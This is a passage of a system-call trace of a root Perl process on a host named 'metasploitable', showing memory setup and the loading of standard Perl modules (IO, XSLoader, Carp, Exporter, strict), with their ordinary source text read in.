\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
8463  07:23:33.105746 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
8463  07:23:33.105790 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d98000
8463  07:23:33.105802 mmap2(0xb7da1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7da1000
8463  07:23:33.105834 mmap2(0xb7da3000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7da3000
8463  07:23:33.105847 close(1)          = 0
8463  07:23:33.105870 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d97000
8463  07:23:33.105883 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d978c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
8463  07:23:33.105941 mprotect(0xb7f13000, 4096, PROT_READ) = 0
8463  07:23:33.105967 munmap(0xb7f5b000, 29913) = 0
8463  07:23:33.105980 set_tid_address(0xb7d97908) = 8463
8463  07:23:33.105989 set_robust_list(0xb7d97910, 0xc) = 0
8463  07:23:33.105998 futex(0xbfbb3850, 0x81 /* FUTEX_??? */, 1) = 0
8463  07:23:33.106012 rt_sigaction(SIGRTMIN, {0xb7f1d2c0, [], SA_SIGINFO}, NULL, 8) = 0
8463  07:23:33.106025 rt_sigaction(SIGRT_1, {0xb7f1d340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
8463  07:23:33.106037 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
8463  07:23:33.106050 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
8463  07:23:33.106069 uname({sys="Linux", node="metasploitable", ...}) = 0
8463  07:23:33.106114 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
8463  07:23:33.106159 brk(0)            = 0x8153000
8463  07:23:33.106169 brk(0x8174000)    = 0x8174000
8463  07:23:33.106211 getuid32()        = 0
8463  07:23:33.106221 geteuid32()       = 0
8463  07:23:33.106230 getgid32()        = 0
8463  07:23:33.106238 getegid32()       = 0
8463  07:23:33.106355 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d76000
8463  07:23:33.106390 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
8463  07:23:33.106407 read(1, "\17\351;\251", 4) = 4
8463  07:23:33.106420 close(1)          = 0
8463  07:23:33.106438 time(NULL)        = 1495625013
8463  07:23:33.106479 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfbb3520) = -1 ENOENT (No such file or directory)
8463  07:23:33.106496 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfbb3520) = -1 ENOENT (No such file or directory)
8463  07:23:33.106513 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfbb3520) = -1 ENOENT (No such file or directory)
8463  07:23:33.106529 stat64("/usr/local/lib/perl/5.8.7", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106541 stat64("/usr/local/share/perl/5.8.7", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106553 stat64("/usr/local/lib/perl/5.8.6", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106564 stat64("/usr/local/share/perl/5.8.6", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106576 stat64("/usr/local/lib/perl/5.8.4", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106587 stat64("/usr/local/share/perl/5.8.4", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106599 stat64("/usr/local/lib/perl/5.8.3", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106610 stat64("/usr/local/share/perl/5.8.3", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106621 stat64("/usr/local/lib/perl/5.8.2", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106633 stat64("/usr/local/share/perl/5.8.2", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106644 stat64("/usr/local/lib/perl/5.8.1", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106656 stat64("/usr/local/share/perl/5.8.1", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106667 stat64("/usr/local/lib/perl/5.8.0", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106678 stat64("/usr/local/share/perl/5.8.0", 0xbfbb3660) = -1 ENOENT (No such file or directory)
8463  07:23:33.106700 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb3358) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.106714 _llseek(0, 0, [0], SEEK_CUR) = 0
8463  07:23:33.106726 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb3358) = -1 EBADF (Bad file descriptor)
8463  07:23:33.106736 _llseek(1, 0, 0xbfbb33a0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
8463  07:23:33.106755 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb3358) = -1 EINVAL (Invalid argument)
8463  07:23:33.106769 _llseek(2, 0, 0xbfbb33a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8463  07:23:33.106807 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
8463  07:23:33.106820 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb3418) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.106847 _llseek(1, 0, [0], SEEK_CUR) = 0
8463  07:23:33.106858 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
8463  07:23:33.106870 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
8463  07:23:33.106888 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
8463  07:23:33.106939 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
8463  07:23:33.106982 getppid()         = 8461
8463  07:23:33.107041 stat64("/etc/perl/IO.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.107055 stat64("/etc/perl/IO.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.107068 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.112941 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.112941 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.112942 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.112942 stat64("/usr/lib/perl5/IO.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.112942 stat64("/usr/lib/perl5/IO.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.112942 stat64("/usr/share/perl5/IO.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.112946 stat64("/usr/share/perl5/IO.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.112959 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.112978 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
8463  07:23:33.112999 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
8463  07:23:33.113013 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2e28) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.113024 _llseek(6, 0, [0], SEEK_CUR) = 0
8463  07:23:33.113047 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
8463  07:23:33.113104 stat64("/etc/perl/XSLoader.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.113117 stat64("/etc/perl/XSLoader.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.113130 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.113143 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.113156 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.113169 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.113183 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.113194 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.113207 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.113231 stat64("/usr/share/perl5/XSLoader.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.113272 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.113284 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
8463  07:23:33.113319 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.113332 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.113343 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.113361 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
8463  07:23:33.113591 brk(0x8195000)    = 0x8195000
8463  07:23:33.114006 _llseek(8, 3407, [3407], SEEK_SET) = 0
8463  07:23:33.114024 _llseek(8, 0, [3407], SEEK_CUR) = 0
8463  07:23:33.114034 close(8)          = 0
8463  07:23:33.114079 stat64("/etc/perl/Carp.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114094 stat64("/etc/perl/Carp.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114108 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114120 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114134 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114146 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114160 stat64("/usr/lib/perl5/Carp.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114171 stat64("/usr/lib/perl5/Carp.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114184 stat64("/usr/share/perl5/Carp.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114196 stat64("/usr/share/perl5/Carp.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114255 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114275 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114314 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.114349 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
8463  07:23:33.114379 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.114398 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.114413 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.114441 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
8463  07:23:33.115128 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
8463  07:23:33.115156 read(8, "", 4096) = 0
8463  07:23:33.115167 close(8)          = 0
8463  07:23:33.115189 stat64("/etc/perl/Exporter.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115203 stat64("/etc/perl/Exporter.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115216 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115229 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115242 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115255 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115269 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115289 stat64("/usr/lib/perl5/Exporter.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115331 stat64("/usr/share/perl5/Exporter.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115358 stat64("/usr/share/perl5/Exporter.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115371 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115384 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115398 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.115411 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
8463  07:23:33.115445 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.115459 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.115471 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.115487 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
8463  07:23:33.116003 _llseek(8, 2217, [2217], SEEK_SET) = 0
8463  07:23:33.116021 _llseek(8, 0, [2217], SEEK_CUR) = 0
8463  07:23:33.116031 close(8)          = 0
8463  07:23:33.116103 stat64("/etc/perl/strict.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116119 stat64("/etc/perl/strict.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116133 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116146 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116159 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116172 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116185 stat64("/usr/lib/perl5/strict.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116197 stat64("/usr/lib/perl5/strict.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116210 stat64("/usr/share/perl5/strict.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116222 stat64("/usr/share/perl5/strict.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116235 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116247 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116260 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116272 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
8463  07:23:33.116336 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.116368 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.116395 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.116414 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
8463  07:23:33.116553 _llseek(8, 598, [598], SEEK_SET) = 0
8463  07:23:33.116567 _llseek(8, 0, [598], SEEK_CUR) = 0
8463  07:23:33.116576 close(8)          = 0
8463  07:23:33.116614 stat64("/etc/perl/warnings.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116628 stat64("/etc/perl/warnings.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116641 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
